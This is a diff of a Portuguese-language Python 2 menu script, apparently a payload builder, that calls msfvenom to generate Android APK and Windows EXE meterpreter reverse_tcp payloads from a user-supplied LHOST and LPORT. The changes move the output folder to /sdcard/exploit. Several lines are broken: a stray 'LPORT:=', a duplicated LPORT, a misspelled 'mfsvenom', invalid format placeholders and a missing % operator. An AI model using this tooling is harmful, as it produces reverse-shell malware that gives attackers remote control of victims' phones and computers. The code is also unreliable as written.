@@ -58,15 +58,15 @@ def menu():
 4{iniciar msfconsole}
 5{sair}
 	'''
-	op=int(raw_input("OPÇÃO: "))
+	op=int(str(raw_input("OPÇÃO: ")))
 	if op == 1:
 		os.system('clear')
 		lhost=raw_input("LHOST: ")
 		lport=int(raw_input("LPORT: "))
 		nome=raw_input("NOME: ")
 		os.system("clear")
-		print "GERANDO APK"
-		os.system("msfvenom -p android/meterpreter/reverse_tcp LHOST=%s LPORT:=%s R > exploit/%s.apk"%(lhost, lport, nome))
+		print "GERANDO APK NA PASTA /SDCARD/EXPLOIT/%s.apk"%(nome)
+		os.system("msfvenom -p android/meterpreter/reverse_tcp LHOST=%s LPORT:=%s R > /sdcard/exploit/%s.apk"%(lhost, lport, nome))
 		os.system("clear")
 		print "PRONTO"
 	elif op == 2:
@@ -75,8 +75,8 @@ def menu():
 		lport=int(raw_input("LPORT: "))
 		nome=raw_input("NOME: ")
 		os.system("clear")
-		print "GERANDO EXE NA PASTA EXPLOIT/ %s"%(nome)
-		os.system("msfvenom -p windows/meterpreter/reverse_tcp LHOST=%s LPORT=%s LPORT=%s R > /exploit/%s.exe"%(lhost, lport, nome))
+		print "GERANDO EXE NA PASTA SDCARD/EXPLOIT/ %s"%(nome)
+		os.system("msfvenom -p windows/meterpreter/reverse_tcp LHOST=%s LPORT=%s LPORT=%s R > /sdcard/exploit/%s.exe"%(lhost, lport, nome))
 		os.system("clear")
 		print "PRONTO"
 	elif op == 3:
@@ -87,8 +87,8 @@ def menu():
 		nome=raw_input("NOME :")
 		print "EX: apk, exe etc"
 		fort=raw_input("FORMATO DO EXPLOIT: ")
-		print "GERANDO %fort NA PASTA EXPLOIT/%nome"%(fort, nome)
-		os.system("mfsvenom -p %payload LHOST=%s LPORT=%s R > /exploit/%s.%s"(payload, lhost, lport, nome, fort))
+		print "GERANDO %fort NA PASTA SDCARD/EXPLOIT/%nome"%(fort, nome)
+		os.system("mfsvenom -p %payload LHOST=%s LPORT=%s R > /sdcard/exploit/%s.%s"(payload, lhost, lport, nome, fort))
 		os.system("clear")
 		print "PRONTO"
 	elif op == 4:
